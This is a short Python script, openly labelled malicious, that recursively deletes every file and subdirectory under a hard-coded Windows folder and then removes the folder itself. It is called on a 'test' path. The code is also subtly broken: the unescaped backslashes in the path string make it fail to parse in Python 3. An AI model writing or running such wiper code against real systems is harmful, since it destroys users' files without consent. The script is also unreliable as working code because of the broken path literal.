import os
import shutil

def malicious_delete(directory):
    try:
        # Check if the directory exists
        if os.path.exists(directory):
            # Iterate through all files and subdirectories in the target directory
            for root, dirs, files in os.walk(directory, topdown=False):
                # Delete all files
                for file in files:
                    file_path = os.path.join(root, file)
                    os.remove(file_path)
                    print(f"Deleted file: {file_path}")
                # Delete all subdirectories
                for dir in dirs:
                    dir_path = os.path.join(root, dir)
                    shutil.rmtree(dir_path)
                    print(f"Deleted directory: {dir_path}")
            # Finally, delete the target directory itself
            shutil.rmtree(directory)
            print(f"Deleted target directory: {directory}")
        else:
            print("Directory does not exist.")
    except Exception as e:
        print(f"Error during deletion: {e}")

# Specify the target directory (e.g., a test directory you create for testing)
target_directory = "C:\Users\LENOVO\Music\tesss"  # Replace with a test directory path

# Execute the malicious deletion
malicious_delete(target_directory)